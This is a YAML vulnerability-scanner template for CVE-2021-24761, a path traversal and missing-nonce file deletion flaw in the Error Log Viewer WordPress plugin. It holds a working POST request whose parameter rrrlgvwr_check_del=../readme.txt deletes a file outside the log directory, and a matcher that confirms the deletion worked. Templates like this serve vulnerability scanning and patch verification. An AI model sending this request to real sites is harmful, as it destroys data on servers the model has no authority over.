id: CVE-2021-24761

info:
  name: Error Log Viewer WordPress Plugin Arbitrary File Deletion
  author: ProjectDiscoveryAI
  severity: medium
  description: The Error Log Viewer WordPress plugin before 1.1.2 does not perform nonce check when deleting a log file and does not have path traversal prevention, which could allow attackers to make a logged in admin delete arbitrary text files on the web server.
  impact: |
    An attacker can delete arbitrary files on the server.
  remediation: |
    Update to the latest version of the Error Log Viewer WordPress Plugin to mitigate CVE-2021-24761.
  reference:
    - https://wpscan.com/vulnerability/c14e1ba6-fc00-4150-b541-0d6740fee4d2
  tags: wpscan

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin.php?page=rrrlgvwr-monitor.php&saved_logs_action=delete&rrrlgvwr_check_del=../readme.txt"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: |
      rrrlgvwr_check_del=../readme.txt
    matchers:
      - type: word
        words:
          - "Log file deleted successfully."
        part: body
